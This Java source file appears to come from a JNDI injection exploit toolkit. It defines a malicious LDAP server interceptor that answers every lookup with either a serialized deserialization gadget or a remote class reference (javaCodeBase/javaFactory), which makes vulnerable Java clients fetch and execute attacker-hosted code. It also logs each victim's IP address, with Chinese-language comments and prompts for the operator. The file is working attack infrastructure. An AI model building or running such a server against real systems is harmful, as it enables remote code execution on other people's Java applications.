package org.interceptor;

import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.util.IPUtils;

import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.Socket;
import java.net.SocketAddress;
import java.net.URL;

public  class SerialOperationInterceptor extends InMemoryOperationInterceptor {

    private byte[] gadget =null;
    private String classUrl = "";
    private boolean isString = true;

    public SerialOperationInterceptor(Object obj) {
        if(obj instanceof String){
            this.classUrl = (String) obj;
        }else {
            this.gadget = (byte[]) obj;
            this.isString = false;
        }
    }

    @Override
    public void processSearchResult(InMemoryInterceptedSearchResult result) {
        String base = result.getRequest().getBaseDN();
        Entry e = new Entry(base);
        try {
            sendResult(result, e);
        } catch (Exception e1) {
            e1.printStackTrace();
        }
    }

    protected void sendResult(InMemoryInterceptedSearchResult result, Entry e) throws Exception {
        /*获取client ip*/
        SocketAddress remoteSocketAddress = IPUtils.getSocket(result);
        System.out.println("收到ip: " + remoteSocketAddress.toString().substring(1) + " 的请求！");

        if(!isString){
            //设置反序列化返回数据
            e.addAttribute("javaClassName", "foo");
            e.addAttribute("javaSerializedData", gadget);
        }else {
            //截取class名字
            URL url = new URL(classUrl);
            String host = "";
            if(url.getPort() == -1){
                host = url.getHost();
            }else{
                host = url.getHost()+ ":" +url.getPort();
            }

            //设置HTTP返回地址
            e.addAttribute("javaClassName", "foo");
            e.addAttribute("javaCodeBase", "http://" + host + "/");
            e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
            e.addAttribute("javaFactory", url.getPath().replace("/","").replace(".class",""));
        }

        result.sendSearchEntry(e);
        if(isString){System.out.println("已返回Class所在WEB服务地址，请查看是否接收到请求");}
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }

}
